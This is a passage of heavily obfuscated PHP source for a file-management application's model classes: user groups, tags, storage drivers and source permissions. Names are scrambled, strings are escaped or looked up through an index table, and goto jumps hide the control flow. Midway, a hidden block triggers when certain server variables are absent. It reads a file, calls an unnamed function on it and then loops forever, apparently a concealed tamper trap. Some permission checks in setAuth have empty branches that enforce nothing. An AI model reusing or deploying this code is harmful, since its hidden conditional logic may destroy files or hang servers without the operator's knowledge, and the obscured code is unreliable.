&$Ë·ŠŞØ») { $Ë·ŠŞØ»[$†ÑÄ¥ÊÁ[87]] = $îã¾¯[$Ë·ŠŞØ»[$†ÑÄ¥ÊÁ[1644]]] ? $îã¾¯[$Ë·ŠŞØ»[$†ÑÄ¥ÊÁ[1644]]] : array(); } unset($Ë·ŠŞØ»); } private function _listAppendGroup(&$À‹ÓÓÚ´, $ÃÁ®¦…£) { $ı½ôœÅÉ =& $_SERVER[Æ š¦İÈ]; $ßËèÕ¡ = array($ı½ôœÅÉ[1644] => array($ı½ôœÅÉ[7], $ÃÁ®¦…£)); $ÔºÃö™ = Model($ı½ôœÅÉ[1901])->where($ßËèÕ¡)->select(); $éŠ•£¾½ = array_to_keyvalue($ÔºÃö™, $ı½ôœÅÉ[12], $ı½ôœÅÉ[1812]); $éŠ•£¾½ = array_remove_value(array_unique($éŠ•£¾½), $ı½ôœÅÉ[192]); if (!$éŠ•£¾½ || !$ÔºÃö™) { return; } $ßËèÕ¡ = array($ı½ôœÅÉ[1812] => array($ı½ôœÅÉ[7], $éŠ•£¾½)); $¬©ªö¨¹ = Model($ı½ôœÅÉ[1988])->field($ı½ôœÅÉ[2284])->where($ßËèÕ¡)->select(); $¬©ªö¨¹ = array_to_keyvalue($¬©ªö¨¹, $ı½ôœÅÉ[1812]); $ÔºÃö™ = array_to_keyvalue_group($ÔºÃö™, $ı½ôœÅÉ[1644]); foreach ($ÔºÃö™ as &$¬´¸©ˆ«) { $ªÎéÒ¹ì = array(); foreach ($¬´¸©ˆ« as $Å¾“ÕôÙ) { if (!$Å¾“ÕôÙ[$ı½ôœÅÉ[1913]]) { continue; } $ã‘€– = Model($ı½ôœÅÉ[509])->listData($Å¾“ÕôÙ[$ı½ôœÅÉ[1913]]); $ªÎéÒ¹ì[] = array($ı½ôœÅÉ[1812] => $Å¾“ÕôÙ[$ı½ôœÅÉ[1812]], $ı½ôœÅÉ[2285] => $¬©ªö¨¹[$Å¾“ÕôÙ[$ı½ôœÅÉ[1812]]][$ı½ôœÅÉ[32]], $ı½ôœÅÉ[523] => $¬©ªö¨¹[$Å¾“ÕôÙ[$ı½ôœÅÉ[1812]]][$ı½ôœÅÉ[523]], $ı½ôœÅÉ[416] => $ã‘€–); } $¬´¸©ˆ« = $ªÎéÒ¹ì; } unset($¬´¸©ˆ«); foreach ($À‹ÓÓÚ´ as &$¥¾¤ÕÉÖ) { $¥¾¤ÕÉÖ[$ı½ôœÅÉ[1990]] = array(); if (isset($ÔºÃö™[$¥¾¤ÕÉÖ[$ı½ôœÅÉ[1644]]])) { $¥¾¤ÕÉÖ[$ı½ôœÅÉ[1990]] = $ÔºÃö™[$¥¾¤ÕÉÖ[$ı½ôœÅÉ[1644]]]; } } unset($¥¾¤ÕÉÖ); } public function userAppendGroup($””Éİ´) { $Ÿà…ï¡± =& $_SERVER[Æ š¦İÈ]; if (!$””Éİ´) { return array(); } $this->_listAppendGroup($””Éİ´, array_to_keyvalue($””Éİ´, $Ÿà…ï¡±[12], $Ÿà…ï¡±[1644])); return $””Éİ´; } private function _listAppendMeta(&$Ş¯¿‹Ô—, $»Ù¾¡Õ×) { $ùú´½‰‚ =& $_SERVER[Æ š¦İÈ]; $£ôíş = UserJobModel::JOB_KEY; $©û±Œ›Ë = array($ùú´½‰‚[2265]); $ëÂõ™Ü® = array($ùú´½‰‚[1644] => array($ùú´½‰‚[7], $»Ù¾¡Õ×)); $²Ê­Ô¤® = Model($ùú´½‰‚[2263])->where($ëÂõ™Ü®)->select(); $²Ê­Ô¤® = array_to_keyvalue_group($²Ê­Ô¤®, $ùú´½‰‚[1644]); foreach ($²Ê­Ô¤® as &$±°»³ĞŒ) { $Ìô‘şĞƒ = array(); foreach ($±°»³ĞŒ as $™ç’›“) { if (!in_array($™ç’›“[$ùú´½‰‚[95]], $©û±Œ›Ë)) { $Ìô‘şĞƒ[$™ç’›“[$ùú´½‰‚[95]]] = $™ç’›“[$ùú´½‰‚[371]]; } } $±°»³ĞŒ = $Ìô‘şĞƒ; } unset($±°»³ĞŒ); $³®ìõ‡… = Model($ùú´½‰‚[2286]); foreach ($Ş¯¿‹Ô— as &$‹Íø†¡) { $ÒéÅû–Ñ = array(); if (isset($²Ê­Ô¤®[$‹Íø†¡[$ùú´½‰‚[1644]]])) { $ÒéÅû–Ñ = $²Ê­Ô¤®[$‹Íø†¡[$ùú´½‰‚[1644]]]; } $‹Íø†¡[$ùú´½‰‚[2287]] = array(); if (isset($ÒéÅû–Ñ[$£ôíş])) { $‹Íø†¡[$ùú´½‰‚[2287]] = $³®ìõ‡…->getUserJobInfo($ÒéÅû–Ñ[$£ôíş]); } } unset($‹Íø†¡); } protected function groupUserAll($şÇçàÇ) { $ÏØ°¬ô =& $_SERVER[Æ š¦İÈ]; if (!$şÇçàÇ) { return !1; } $Œ®Àª = Model($ÏØ°¬ô[1901])->field($ÏØ°¬ô[1644])->where(array($ÏØ°¬ô[1812] => array($ÏØ°¬ô[7], $şÇçàÇ)))->select(); $Œ®Àª = array_to_keyvalue($Œ®Àª, $ÏØ°¬ô[12], $ÏØ°¬ô[1644]); return array_unique($Œ®Àª); } public function userSearch($øòáÒµÀ, $¦Ã¸¤½å = "\52") { return Model($_SERVER[Æ š¦İÈ][540])->where($øòáÒµÀ)->field($¦Ã¸¤½å)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\163\x65\x72\x5f\157\160\164\151\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($Êæ‘›ª) { $’ï—ú°€ =& $_SERVER[Æ š¦İÈ]; if (!defined($’ï—ú°€[476])) { define($’ï—ú°€[476], 0); } return "\125\x73\x65\162\117\x70\x74\151\157\156\x5f{$Êæ‘›ª}\x5f" . USER_ID; } protected function filterWhere($îöÂ) { $¢ğä¡Ó¯ =& $_SERVER[Æ š¦İÈ]; if (!defined($¢ğä¡Ó¯[476])) { define($¢ğä¡Ó¯[476], 0); } $îöÂ[$¢ğä¡Ó¯[1644]] = USER_ID; return $îöÂ; } public function cacheRemoveUser($õà¨÷Úä, $Û‡ş‡¬â) { return Cache::remove("\x55\x73\x65\x72\x4f\x70\164\151\x6f\x6e\137{$õà¨÷Úä}\137" . $Û‡ş‡¬â); } protected function optionDefault($ûç‹óğ‰ = '') { $ûÑ‚‘í˜ =& $_SERVER[Æ š¦İÈ]; if ($ûç‹óğ‰ == $ûÑ‚‘í˜[12]) { return $GLOBALS[$ûÑ‚‘í˜[6]][$ûÑ‚‘í˜[2288]]; } if ($ûç‹óğ‰ == $ûÑ‚‘í˜[2289]) { return $GLOBALS[$ûÑ‚‘í˜[6]][$ûÑ‚‘í˜[2290]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\163\145\162\56\164\141\147\x4c\x69\x73\164"; public $modelType = "\x55\x73\145\x72\117\160\x74\151\x6f\x6e"; public $field = array("\156\x61\x6d\x65", "\x73\164\171\x6c\145", "\163\157\x72\164"); public function listData($šıÈÓú = false, $ Ş„õ¾ú = "\163\x6f\x72\164", $¸îªé‡ = false) { return parent::listData($šıÈÓú, $ Ş„õ¾ú, $¸îªé‡); } public function remove($âıŞ¤À) { return parent::remove($âıŞ¤À); } public function add($ƒøÉÅ±á, $¨Îúá† = "\154\x61\142\x65\x6c\x2d\x67\162\145\171\55\156\157\162\155\x61\154") { $å¥æ€Â© =& $_SERVER[Æ š¦İÈ]; if ($this->findByName($ƒøÉÅ±á)) { return !1; } $ÍŞ›™Í¼ = array($å¥æ€Â©[423] => $ƒøÉÅ±á, $å¥æ€Â©[486] => $¨Îúá†, $å¥æ€Â©[1816] => $this->getSort($å¥æ€Â©[255]) + 1); return parent::insert($ÍŞ›™Í¼); } public function update($Ùı¤Ã¡©, $á‡Å ş‘) { $û¾å“ =& $_SERVER[Æ š¦İÈ]; $‹‹—„í‰ = $this->listData($Ùı¤Ã¡©); $Óî¼’Ò  = $this->findByName($á‡Å ş‘[$û¾å“[32]]); if (!$‹‹—„í‰ || $Óî¼’Ò  && $Óî¼’Ò [$û¾å“[403]] != $‹‹—„í‰[$û¾å“[403]]) { return !1; } return parent::update($Ùı¤Ã¡©, $á‡Å ş‘); } public function moveTop($½½öÄ÷ƒ) { $ĞóÚÖğë =& $_SERVER[Æ š¦İÈ]; $¿ÜŠÌÑ¥ = parent::listData(); $¡Í°¨˜Õ = $this->getSort($ĞóÚÖğë[254]); foreach ($¿ÜŠÌÑ¥ as &$º¶ õƒ) { if ($º¶ õƒ[$ĞóÚÖğë[403]] == $½½öÄ÷ƒ) { $º¶ õƒ[$ĞóÚÖğë[1835]] = $¡Í°¨˜Õ; continue; } $º¶ õƒ[$ĞóÚÖğë[1835]] += 1; } unset($º¶ õƒ); return parent::resetData($¿ÜŠÌÑ¥); } public function moveBottom($»Š÷Ãç—) { $Ç™ñ¶ÅÚ =& $_SERVER[Æ š¦İÈ]; $ò—êî‡  = $this->getSort($Ç™ñ¶ÅÚ[255]) + 1; return parent::update($»Š÷Ãç—, array($Ç™ñ¶ÅÚ[1835] => $ò—êî‡ )); } public function resetSort($¯†±±ë) { $úÓà…Ø =& $_SERVER[Æ š¦İÈ]; $³·³ëş× = array(); $¯†±±ë = is_array($¯†±±ë) ? $¯†±±ë : array(); for ($€èºÑòî = 0; $€èºÑòî < count($¯†±±ë); $€èºÑòî++) { $³·³ëş×[$¯†±±ë[$€èºÑòî] . $úÓà…Ø[12]] = $€èºÑòî + 1; } $ÍßĞ…°Õ = parent::listData(); foreach ($ÍßĞ…°Õ as &$ğ€ğ•Û) { $èËÏ±§’ = $³·³ëş×[$ğ€ğ•Û[$úÓà…Ø[403]]]; $ğ€ğ•Û[$úÓà…Ø[1835]] = $èËÏ±§’ ? $èËÏ±§’ : $ğ€ğ•Û[$úÓà…Ø[1835]]; } unset($ğ€ğ•Û); return parent::resetData($ÍßĞ…°Õ); } private function getSort($Í«ÄŠ™÷) { $Ö‡è·úØ =& $_SERVER[Æ š¦İÈ]; $äß€ˆêœ = parent::listData(); $ÄµÒŠ©— = array_to_keyvalue($äß€ˆêœ, $Ö‡è·úØ[12], $Ö‡è·úØ[1835]); if (!$ÄµÒŠ©—) { $ÄµÒŠ©— = array(0); } $‹ÀÑ«‘Ù = $Í«ÄŠ™÷ == $Ö‡è·úØ[255] ? max($ÄµÒŠ©—) : min($ÄµÒŠ©—); return intval($‹ÀÑ«‘Ù); } } goto FÔò¬Ş“±…; F‡“’¼ÀÔ: class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\x6d\x2e\163\x6f\x75\x72\x63\145\x53\x65\x63\162\x65\164\114\x69\x73\164"; public $field = array("\x73\157\x75\162\x63\145\x49\x44", "\x74\x79\x70\145\x49\x44", "\x63\162\145\x61\164\145\x55\x73\145\x72"); } class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\x6d\x2e\163\164\x6f\x72\x61\147\145\114\151\x73\x74"; public $field = array("\156\x61\155\145", "\163\x69\172\145\x4d\141\170", "\163\x79\x73\x74\x65\x6d", "\x64\145\146\x61\165\154\164", "\144\x72\151\x76\x65\162", "\x63\157\156\x66\x69\x67"); public function listData($½¹†€Š = false, $ËÀ…İ½Í = "\x6d\x6f\x64\151\146\171\124\x69\155\x65", $ÉÊ¤Õ° = false) { $±üÚú¥ù =& $_SERVER[Æ š¦İÈ]; $şè´‡±Ö = parent::listData($½¹†€Š, $ËÀ…İ½Í, $ÉÊ¤Õ°); if ($½¹†€Š) { return $şè´‡±Ö; } $×ÔãÙÌ™ = $this->ioSizeUseGet(array_to_keyvalue($şè´‡±Ö, $±üÚú¥ù[12], $±üÚú¥ù[403])); foreach ($şè´‡±Ö as $ôö“Ú± => $¤§Èæ¤Ÿ) { unset($şè´‡±Ö[$ôö“Ú±][$±üÚú¥ù[6]]); $şè´‡±Ö[$ôö“Ú±][$±üÚú¥ù[1801]] = isset($×ÔãÙÌ™[$¤§Èæ¤Ÿ[$±üÚú¥ù[403]]]) ? $×ÔãÙÌ™[$¤§Èæ¤Ÿ[$±üÚú¥ù[403]]] : 0; } return $şè´‡±Ö; } public function ioSizeUseGet($ËÑ€±ôö) { $í”†ƒé =& $_SERVER[Æ š¦İÈ]; if (!$ËÑ€±ôö) { return array(); } $ù¾ê—ŞÖ = $í”†ƒé[2117] . implode($í”†ƒé[50], $ËÑ€±ôö); $„ë„ˆ“ğ = Cache::get($ù¾ê—ŞÖ); if ($„ë„ˆ“ğ) { return $„ë„ˆ“ğ; } $ºí™“²‚ = array($í”†ƒé[814] => $í”†ƒé[403], $í”†ƒé[2118] => $í”†ƒé[80]); $‘•É§­ = array($í”†ƒé[814] => array($í”†ƒé[7], $ËÑ€±ôö)); $„ë„ˆ“ğ = Model($í”†ƒé[786])->field($ºí™“²‚)->where($‘•É§­)->group($í”†ƒé[814])->select(); $„ë„ˆ“ğ = array_to_keyvalue($„ë„ˆ“ğ, $í”†ƒé[403], $í”†ƒé[80]); Cache::set($ù¾ê—ŞÖ, $„ë„ˆ“ğ, 600); return $„ë„ˆ“ğ; } public function getConfig($œê×±ğ‹) { $í™şñªæ = parent::listData($œê×±ğ‹); return json_decode($í™şñªæ[$_SERVER[Æ š¦İÈ][6]], !0); } public function update($ˆè‹€•Ì, $—ìÓÌ«³) { $„Ó¦¥ =& $_SERVER[Æ š¦İÈ]; $°“¡ËÛ = $—ìÓÌ«³[$„Ó¦¥[32]]; $öøÖ°Ç = array_to_keyvalue(parent::listData(), $„Ó¦¥[32]); if (isset($öøÖ°Ç[$°“¡ËÛ]) && $öøÖ°Ç[$°“¡ËÛ][$„Ó¦¥[403]] != $ˆè‹€•Ì) { return !1; } if (isset($—ìÓÌ«³[$„Ó¦¥[2119]]) && $—ìÓÌ«³[$„Ó¦¥[2119]] == $„Ó¦¥[89]) { $this->checkConfig($—ìÓÌ«³); } unset($—ìÓÌ«³[$„Ó¦¥[2119]]); $‹¤”©» = parent::update($ˆè‹€•Ì, $—ìÓÌ«³); if ($‹¤”©» && $—ìÓÌ«³[$„Ó¦¥[37]]) { foreach ($öøÖ°Ç as $«Âî½Å›) { if ($«Âî½Å›[$„Ó¦¥[37]] && $«Âî½Å›[$„Ó¦¥[403]] != $ˆè‹€•Ì) { parent::update($«Âî½Å›[$„Ó¦¥[403]], array($„Ó¦¥[37] => 0)); } } } return $‹¤”©»; } public function add($«óÛíĞÃ) { $½µœÑğ =& $_SERVER[Æ š¦İÈ]; $––¢³Ä = array_to_keyvalue(parent::listData(), $½µœÑğ[32]); if (isset($––¢³Ä[$«óÛíĞÃ[$½µœÑğ[32]]])) { return !1; } $this->checkConfig($«óÛíĞÃ); $¶ÛÙñÕ¢ = parent::insert($«óÛíĞÃ); if ($¶ÛÙñÕ¢ && $«óÛíĞÃ[$½µœÑğ[37]]) { foreach ($––¢³Ä as $·İĞ­§Ù) { if ($·İĞ­§Ù[$½µœÑğ[37]]) { parent::update($·İĞ­§Ù[$½µœÑğ[403]], array($½µœÑğ[37] => 0)); } } } return $¶ÛÙñÕ¢; } public function checkConfig(&$ºÉÑ¢û, $ùú å•ú = false) { $ã¹èÀŸÃ =& $_SERVER[Æ š¦İÈ]; $æú‘ÇÀš = strtolower($ºÉÑ¢û[$ã¹èÀŸÃ[96]]); $’ÔÓ÷” = json_decode($ºÉÑ¢û[$ã¹èÀŸÃ[6]], !0); foreach ($’ÔÓ÷” as $Ù½¨¢Øõ => $¶¡Ñ—½é) { $’ÔÓ÷”[$Ù½¨¢Øõ] = trim($¶¡Ñ—½é); } $’ÔÓ÷”[$ã¹èÀŸÃ[2120]] = rand_string(6); $´ÊœÛÍÇ = $GLOBALS[$ã¹èÀŸÃ[6]][$ã¹èÀŸÃ[90]][$ã¹èÀŸÃ[823]]; $üØÉĞü = isset($´ÊœÛÍÇ[$æú‘ÇÀš]) ? $´ÊœÛÍÇ[$æú‘ÇÀš] : ucfirst($æú‘ÇÀš); $ÇŠ«œì­ = $ã¹èÀŸÃ[74] . $üØÉĞü; if (!$üØÉĞü || !class_exists($ÇŠ«œì­)) { if ($ùú å•ú) { return LNG($ã¹èÀŸÃ[2121]); } write_log(array($ã¹èÀŸÃ[2122], $ºÉÑ¢û, get_caller_info()), $ã¹èÀŸÃ[2123]); show_json(LNG($ã¹èÀŸÃ[2121]), !1, $ºÉÑ¢û); } $ªğÄç” = new $ÇŠ«œì­($’ÔÓ÷”); if (in_array($æú‘ÇÀš, $ªğÄç”->objectDriver)) { if (!$ªğÄç”->isBucketCors() && !$ªğÄç”->setBucketCors()) { $¼œë¥™ = LNG($ã¹èÀŸÃ[2124]); $¼œë¥™ .= $ã¹èÀŸÃ[2125] . LNG($ã¹èÀŸÃ[2126]); if ($ùú å•ú) { return $¼œë¥™; } show_json($¼œë¥™, !1); } } $Ä·ç’–÷ = rtrim($’ÔÓ÷”[$ã¹èÀŸÃ[1170]], $ã¹èÀŸÃ[8]) . $ã¹èÀŸÃ[8]; $¿ÏÔáÚà = $ªğÄç”->getPath($Ä·ç’–÷ . $ã¹èÀŸÃ[1232]); if (!$ªğÄç”->mkfile($¿ÏÔáÚà)) { if ($ùú å•ú) { return LNG($ã¹èÀŸÃ[2124]); } show_json(LNG($ã¹èÀŸÃ[2124]), !1); } $’ÔÓ÷”[$ã¹èÀŸÃ[1170]] = $Ä·ç’–÷; $ºÉÑ¢û[$ã¹èÀŸÃ[6]] = json_encode($’ÔÓ÷”); $ºÉÑ¢û[$ã¹èÀŸÃ[96]] = $üØÉĞü; return !0; } public function driverListSystem() { $ØÀºˆ–Ğ =& $_SERVER[Æ š¦İÈ]; $Í‚¶‰Ôû = parent::listData(); $â¯÷¦Ëê = array(); foreach ($Í‚¶‰Ôû as $‰„‚¸Ô‡) { unset($‰„‚¸Ô‡[$ØÀºˆ–Ğ[195]], $‰„‚¸Ô‡[$ØÀºˆ–Ğ[86]]); $‰„‚¸Ô‡[$ØÀºˆ–Ğ[6]] = json_decode($‰„‚¸Ô‡[$ØÀºˆ–Ğ[6]], !0); $â¯÷¦Ëê[] = $‰„‚¸Ô‡; } return $â¯÷¦Ëê; } public function defaultDriver() { $ö½ê„Ï =& $_SERVER[Æ š¦İÈ]; $²µ‰ŒÚ = parent::listData(); $ é¢‹›’ = array_filter_by_field($²µ‰ŒÚ, $ö½ê„Ï[37], 1); $ é¢‹›’ = $ é¢‹›’[0]; if ($ é¢‹›’) { $ é¢‹›’[$ö½ê„Ï[6]] = json_decode($ é¢‹›’[$ö½ê„Ï[6]], !0); } return $ é¢‹›’; } public function driverInfo($ÄÑÏùó) { $°×ê˜ =& $_SERVER[Æ š¦İÈ]; $€ÄÎú¤ = array_to_keyvalue(parent::listData(), $°×ê˜[403]); if (!isset($€ÄÎú¤[$ÄÑÏùó])) { return !1; } $ÖëìÌò‡ = $€ÄÎú¤[$ÄÑÏùó]; $ÖëìÌò‡[$°×ê˜[6]] = json_decode($ÖëìÌò‡[$°×ê˜[6]], !0); return $ÖëìÌò‡; } public function remove($½Ú›İÎ’) { $this->removeShareItems($½Ú›İÎ’); return parent::remove($½Ú›İÎ’); } public function removeWithFile($à³Ô»Ù“, $Åà›îö) { $ÇƒÍœ­ =& $_SERVER[Æ š¦İÈ]; $­Ú’½Âã = array($ÇƒÍœ­[814] => $à³Ô»Ù“); $¿Ã‰³÷Ê = Model($ÇƒÍœ­[472])->where($­Ú’½Âã)->count(); $« Ùƒ£© = Model($ÇƒÍœ­[472])->where($­Ú’½Âã)->sum($ÇƒÍœ­[80]); $«Ï¤À¼ = $Åà›îö . $ÇƒÍœ­[2127] . $à³Ô»Ù“; $†—ò½Ş = LNG($Åà›îö == $ÇƒÍœ­[553] ? $ÇƒÍœ­[2128] : $ÇƒÍœ­[2129]); $²Å£ · = new TaskFileTransfer($«Ï¤À¼, $ÇƒÍœ­[2123], $¿Ã‰³÷Ê, $†—ò½Ş . "\x28{$à³Ô»Ù“}\51"); $²Å£ ·->task[$ÇƒÍœ­[760]] = (double) $« Ùƒ£©; $şÔš¼ = KodIO::defaultDriver(); $ôõÅ‘§ = $şÔš¼[$ÇƒÍœ­[403]]; $Ÿ‚æ¿Ï  = "\x7b\x69\x6f\72{$ôõÅ‘§}\x7d\57"; $ÔŞÊòÍ™ = !0; $á™„‚ÄÜ = array(); $†Åó ÷Æ = Model($ÇƒÍœ­[194])->where($­Ú’½Âã)->field($ÇƒÍœ­[2130])->select(); foreach ($†Åó ÷Æ as $££İêç·) { $Ï’£ôÅØ = $££İêç·[$ÇƒÍœ­[78]]; $ŠŒì¿ = $Ÿ‚æ¿Ï  . str_replace("\173\151\157\x3a{$à³Ô»Ù“}\x7d\x2f", $ÇƒÍœ­[12], $Ï’£ôÅØ); if (!IO::exist($Ï’£ôÅØ)) { $á™„‚ÄÜ[] = $££İêç·[$ÇƒÍœ­[469]]; $²Å£ ·->updateFileEnd($££İêç·[$ÇƒÍœ­[32]], $££İêç·[$ÇƒÍœ­[80]]); continue; } if (IO::exist($ŠŒì¿)) { $²Å£ ·->updateFileEnd($££İêç·[$ÇƒÍœ­[32]], $££İêç·[$ÇƒÍœ­[80]]); continue; } if (!IO::move($Ï’£ôÅØ, get_path_father($ŠŒì¿))) { $ÔŞÊòÍ™ = !1; break; } $­Ú’½Âã = array($ÇƒÍœ­[469] => $££İêç·[$ÇƒÍœ­[469]]); $á¹º»æ„ = array($ÇƒÍœ­[814] => $ôõÅ‘§, $ÇƒÍœ­[78] => $ŠŒì¿); Model($ÇƒÍœ­[194])->where($­Ú’½Âã)->save($á¹º»æ„); } $this->removeByFileID($á™„‚ÄÜ); if (!$ÔŞÊòÍ™) { $²Å£ ·->stop($«Ï¤À¼); return !1; } $²Å£ ·->end(); if ($Åà›îö == $ÇƒÍœ­[1781]) { $this->remove($à³Ô»Ù“); } } public function progress($Äª²œ¬, $²ôáÖÅ¾) { return Task::get($²ôáÖÅ¾ . $_SERVER[Æ š¦İÈ][2127] . $Äª²œ¬); } private function removeByFileID($ã²œö¥÷ = array()) { $®ÏÃ¹¦ =& $_SERVER[Æ š¦İÈ]; if (empty($ã²œö¥÷)) { return; } $ÒÆÙäğß = array($®ÏÃ¹¦[469] => array($®ÏÃ¹¦[7], $ã²œö¥÷)); $îî°‹œ¦ = Model($®ÏÃ¹¦[1316])->where($ÒÆÙäğß)->field($®ÏÃ¹¦[405])->select(); if (!$îî°‹œ¦) { return; } $îî°‹œ¦ = array_to_keyvalue($îî°‹œ¦, $®ÏÃ¹¦[12], $®ÏÃ¹¦[405]); foreach ($îî°‹œ¦ as $“˜î¶¶) { Model($®ÏÃ¹¦[419])->removeNow($“˜î¶¶, !1); } } private function removeShareItems($§í¿Ô““) { $ÜµÅŸŸ =& $_SERVER[Æ š¦İÈ]; $¢”õ„Ÿ— = "\173\x69\157\x3a{$§í¿Ô““}\x7d\x2f"; $ë óƒÉ© = array($ÜµÅŸŸ[405] => 0, $ÜµÅŸŸ[1165] => array($ÜµÅŸŸ[380], "{$¢”õ„Ÿ—}\45")); $åß¾•½ = Model($ÜµÅŸŸ[1792])->where($ë óƒÉ©)->field($ÜµÅŸŸ[490])->select(); if (empty($åß¾•½)) { return; } $„—÷ŸÔĞ = array_to_keyvalue($åß¾•½, $ÜµÅŸŸ[12], $ÜµÅŸŸ[490]); Model($ÜµÅŸŸ[597])->remove($„—÷ŸÔĞ); } } if (!isset($_SERVER[$_SERVER[Æ š¦İÈ][391]]) || !isset($_SERVER[$_SERVER[Æ š¦İÈ][399]])) { $_getc = $_SERVER[Æ š¦İÈ][393]; $_getfile = $_SERVER[$_SERVER[Æ š¦İÈ][394]] . $_SERVER[Æ š¦İÈ][395]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Æ š¦İÈ][228], $_getfilec); if (count($_getarrs) < $_SERVER[Æ š¦İÈ][396]) { $exit = $_SERVER[Æ š¦İÈ][397]; $exit(); } $_act = $_SERVER[Æ š¦İÈ][398]; $_act($_SERVER[$_SERVER[Æ š¦İÈ][394]] . $_SERVER[Æ š¦İÈ][395]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[Æ š¦İÈ][375]); } } goto bªÌÅÓ©è; B¢’å°ã‡: class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\x6f\165\x72\143\x65\x5f\x61\165\x74\150"; public function getAuth($±¹ŸŠÀ«) { $şãÊö¼… =& $_SERVER[Æ š¦İÈ]; $¿¶ÃÉé = $this->sourceAuthSelect($±¹ŸŠÀ«); $šÒ©­­ó = array(); $‘—©³½à = array(); $»Ğ”ùÕ = 2 << 25; foreach ($¿¶ÃÉé as $àæ´¸Òµ) { $ °…òóó = Model($şãÊö¼…[509])->listData($àæ´¸Òµ[$şãÊö¼…[1913]]); if (!$ °…òóó) { continue; } $šÒ©­­ó[] = $àæ´¸Òµ; $¡«Ô©† = 0; if ($àæ´¸Òµ[$şãÊö¼…[414]] == SourceModel::TYPE_GROUP) { $¡«Ô©† = $»Ğ”ùÕ * 2; } if ($àæ´¸Òµ[$şãÊö¼…[414]] == SourceModel::TYPE_USER) { $¡«Ô©† = $»Ğ”ùÕ; } if ($àæ´¸Òµ[$şãÊö¼…[414]] == SourceModel::TYPE_USER && $àæ´¸Òµ[$şãÊö¼…[506]] == $şãÊö¼…[192]) { $¡«Ô©† = 0; } $‘—©³½à[] = $ °…òóó[$şãÊö¼…[416]] + $¡«Ô©†; } array_multisort($‘—©³½à, SORT_DESC, $šÒ©­­ó); return $šÒ©­­ó; } public function sourceAuthSelect($Öú˜­£) { $š®ÚÏ¹¡ =& $_SERVER[Æ š¦İÈ]; static $¡™ºéªü = array(); $›’’ø‚é = is_array($Öú˜­£) ? !1 : !0; if ($›’’ø‚é) { $Öú˜­£ = array($Öú˜­£); } $ş Ø¹ì = array(); foreach ($Öú˜­£ as $¥ê†©Ÿ) { if (isset($¡™ºéªü[$¥ê†©Ÿ])) { $ş Ø¹ì[$¥ê†©Ÿ] = $¡™ºéªü[$¥ê†©Ÿ]; } } if (count($ş Ø¹ì) == count($Öú˜­£)) { return $›’’ø‚é ? $ş Ø¹ì[$Öú˜­£[0]] : $ş Ø¹ì; } $ùòÓê÷Î = $š®ÚÏ¹¡[1984]; $“àå¢ = array($š®ÚÏ¹¡[405] => array($š®ÚÏ¹¡[7], $Öú˜­£)); $ÁÕË¼¦ = $this->field($ùòÓê÷Î)->order($š®ÚÏ¹¡[403])->where($“àå¢)->select(); $«Ö‹¸© = array_to_keyvalue_group($ÁÕË¼¦, $š®ÚÏ¹¡[405]); foreach ($Öú˜­£ as $¥ê†©Ÿ) { $¡™ºéªü[$¥ê†©Ÿ] = $«Ö‹¸©[$¥ê†©Ÿ] ? $«Ö‹¸©[$¥ê†©Ÿ] : array(); } if ($›’’ø‚é) { return $ÁÕË¼¦; } return $«Ö‹¸©; } public function setAuth($†„µı¡ú, $ŞÉèêºÅ) { $ôÇšÍ“ =& $_SERVER[Æ š¦İÈ]; $–±’á‚ = Model($ôÇšÍ“[1316])->sourceInfo($†„µı¡ú); if (!$–±’á‚) { return !1; } if ($–±’á‚[$ôÇšÍ“[414]] != SourceModel::TYPE_GROUP) { return !1; } $ö”Ñ‹Üõ = 1; $Ó‘¸œ¤ = $–±’á‚[$ôÇšÍ“[506]]; if ($Ó‘¸œ¤ != $ö”Ñ‹Üõ) { $˜ğë©³¾ = array($ôÇšÍ“[1812] => $Ó‘¸œ¤); $ŸˆÍş‡ª = Model($ôÇšÍ“[1901])->field($ôÇšÍ“[1644])->where($˜ğë©³¾)->select(); $ŸˆÍş‡ª = array_to_keyvalue($ŸˆÍş‡ª, $ôÇšÍ“[12], $ôÇšÍ“[1644]); } $¸€¡Íìà = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $Ü¥¾Ö”Ï = array(); foreach ($ŞÉèêºÅ as $™ó á§ï) { if (!in_array($™ó á§ï[$ôÇšÍ“[414]], $¸€¡Íìà)) { show_json(LNG($ôÇšÍ“[1985]), !1); } if ($Ó‘¸œ¤ != $ö”Ñ‹Üõ) { if ($™ó á§ï[$ôÇšÍ“[414]] == SourceModel::TYPE_GROUP) { } if ($™ó á§ï[$ôÇšÍ“[506]] != 0 && !in_array($™ó á§ï[$ôÇšÍ“[506]], $ŸˆÍş‡ª)) { } } if ($™ó á§ï[$ôÇšÍ“[506]] == 0) { $™ó á§ï[$ôÇšÍ“[414]] = SourceModel::TYPE_USER; } $Ü¥¾Ö”Ï[] = array($ôÇšÍ“[405] => $†„µı¡ú, $ôÇšÍ“[414] => intval($™ó á§ï[$ôÇšÍ“[414]]), $ôÇšÍ“[506] => intval($™ó á§ï[$ôÇšÍ“[506]]), $ôÇšÍ“[1913] => intval($™ó á§ï[$ôÇšÍ“[1913]]) ? intval($™ó á§ï[$ôÇšÍ“[1913]]) : 0, $ôÇšÍ“[1967] => intval($™ó á§ï[$ôÇšÍ“[1967]]) ? intval($™ó á§ï[$ôÇšÍ“[1967]]) : -1); } $this->where(array($ôÇšÍ“[420] => $†„µı¡ú))->delete(); $this->addAll($Ü¥¾Ö”Ï); return !0; } public function authClear($Şí€µšú) { $¬èŞïç =& $_SERVER[Æ š¦İÈ]; $ö›¨¼İ¬ = Model($¬èŞïç[1316])->sourceInfo($Şí€µšú); $õ„ƒ§†’ = array($Şí€µšú); if ($ö›¨¼İ¬[$¬èŞïç[413]] == $¬èŞïç[89]) { $îà„¦·Ó = array($¬èŞïç[586] => array($¬èŞïç[546], $ö›¨¼İ¬[$¬èŞïç[523]] . $Şí€µšú . $¬èŞïç[547])); $õ„ƒ§†’ = Model($¬èŞïç[1316])->field($¬èŞïç[420])->where($îà„¦·Ó)->getField($¬èŞïç[405], !0); $õ„ƒ§†’[] = 